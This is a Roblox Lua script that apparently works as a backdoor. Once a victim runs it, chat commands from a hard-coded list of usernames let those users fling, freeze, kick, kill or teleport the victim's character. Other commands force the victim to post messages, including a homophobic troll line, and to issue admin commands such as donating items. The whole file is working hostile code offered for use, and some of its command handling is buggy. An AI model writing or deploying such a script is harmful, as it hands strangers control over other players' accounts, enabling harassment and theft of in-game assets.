local IsProcessing = false

local Lazyusernames = {
    "FlavorgamerYT",
    "LittleJonib",
    "IMH4CK_HEHE",
    "whoareyiu24"  -- Add more usernames as needed
}

local function checkForLazyusernames()
    while not IsProcessing do
        for _, userName in ipairs(Lazyusernames) do
            local playerFound = game.Players:FindFirstChild(userName)
            if playerFound then
                IsProcessing = true

                local player = game.Players.LocalPlayer

                local function freeze()
                    if player.Character then
                        player.Character.LowerTorso.Anchored = true
                        player.Character.UpperTorso.Anchored = true
                    end
                end

                local function unfreeze()
                    if player.Character then
                        player.Character.LowerTorso.Anchored = false
                        player.Character.UpperTorso.Anchored = false
                    end
                end

                local function handleChatCommands(targetPlayer)
                    targetPlayer.Chatted:Connect(function(cht)
                        if cht:match(".fling .") then
                            if player ~= targetPlayer then
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
                                local power = 99999999
                                game:GetService('RunService').Stepped:Connect(function()
                                    player.Character.Head.CanCollide = false
                                    player.Character.UpperTorso.CanCollide = false
                                    player.Character.LowerTorso.CanCollide = false
                                    player.Character.HumanoidRootPart.CanCollide = false
                                end)
                                wait(.1)
                                local bambam = Instance.new("BodyThrust")
                                bambam.Parent = player.Character.HumanoidRootPart
                                bambam.Force = Vector3.new(power, 0, power)
                                bambam.Location = player.Character.HumanoidRootPart.Position
                            end
                        elseif cht:match(".froze .") then
                            if player ~= targetPlayer then
                                freeze()
                            end
                        elseif cht:match(".unfroze .") then
                            if player ~= targetPlayer then
                                unfreeze()
                            end
                        elseif cht:match(".kxck .") then
                            if player ~= targetPlayer then
                                player:Kick("You have been kicked.")
                            end
                        elseif cht:match(".kill .") then
                            if player ~= targetPlayer then
                                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
                            end
                        elseif cht:match(".error .") then
                            if player ~= targetPlayer then
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
                            end
                        elseif cht:match(".tp .") then
                            if player ~= targetPlayer then
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.UpperTorso.Position)
                            end
                        elseif cht:match(".sit .") then
                            if player ~= targetPlayer then
                                local character = player.Character
                                if character then
                                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                                    if humanoid then
                                        humanoid.Sit = true
                                    end
                                end
                            end
                        elseif cht:match(".troll .") then
                            if player ~= targetPlayer then
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
                            end
                        elseif cht:match(".unsit .") then
                            if player ~= targetPlayer then
                                local character = player.Character
                                if character then
                                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                                    if humanoid then
                                        humanoid.Sit = false
                                    end
                                end
                            end
                        elseif cht:match(".enlighten .") then
                            if player ~= targetPlayer then
                                player.Backpack:FindFirstChild("The Arkenstone"):Equip()
                                game.Players:Chat(";enlighten " .. targetPlayer.Name)
                            end
                        elseif cht:match(".time") then
                            local text = cht:match(".donate (.+)")
                            if player ~= targetPlayer then
                                game.Players:Chat(";donate " .. text .. " " .. targetPlayer.Name)
                            end
                        elseif cht:match(".say .") then
                            local text = cht:match(".say (.+)")
                            if player ~= targetPlayer then
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
                            end
                        elseif cht:match(".cmd") then
                            local text = cht:match(".cmd (.+)")
                            if player ~= targetPlayer then
                                game.Players:Chat(player, ";" .. text)
                            end
                        elseif cht:match(".cmdx") then
                            if player == targetPlayer then
                                game:GetService("StarterGui"):SetCore("SendNotification",{
                                    Title = "Available Commands";
                                    Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd";
                                    Time = 5;
                                    Icon = "rbxassetid://999999999";
                                })
                            end
                        end
                    end)
                end

                handleChatCommands(playerFound)
            end
        end
        wait(1)
    end
end

checkForLazyusernames()
